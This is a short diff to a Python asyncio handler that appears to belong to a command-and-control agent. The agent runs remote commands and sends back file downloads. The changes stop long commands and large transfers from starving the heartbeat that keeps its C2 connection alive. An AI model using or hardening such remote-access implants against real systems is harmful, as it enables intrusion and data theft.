@@ -134,7 +134,11 @@ class Handler:
                 await self._write_packet(writer, encode_response(req_id, cmd, f"Error: bad TLV: {e}"))
                 return
             logger.debug(f"recv cmd req_id={req_id} cmd={cmd:#x} action={name} params={params}")
-            result = exec_action(name, params, cmd_timeout=self._cmd_timeout)
+            # Run in a worker thread so a long exec_cmd (subprocess.run) or a
+            # slow file op does not block the asyncio loop: the heartbeat task
+            # and the read loop must keep running or the C2 watchdog could
+            # disconnect the agent mid-command.
+            result = await asyncio.to_thread(exec_action, name, params, cmd_timeout=self._cmd_timeout)
             logger.debug(f"exec result req_id={req_id} action={name} -> {result!r}")
             await self._write_packet(writer, encode_response(req_id, cmd, result))
             return
@@ -262,6 +266,11 @@ class Handler:
                     end_flag = END_FLAG_CONTINUE
                 await self._write_packet(writer, encode_data_packet(req_id, end_flag, chunk))
                 total += len(chunk)
+                # Yield so the heartbeat loop (which shares the write lock) can
+                # send its packets between data chunks; otherwise a large
+                # download can starve heartbeats and trigger a C2 watchdog
+                # timeout mid-transfer.
+                await asyncio.sleep(0)
                 if end_flag == END_FLAG_LAST:
                     break
             logger.debug(f"exec result req_id={req_id} action=download -> {total} bytes sent for {src_path}")
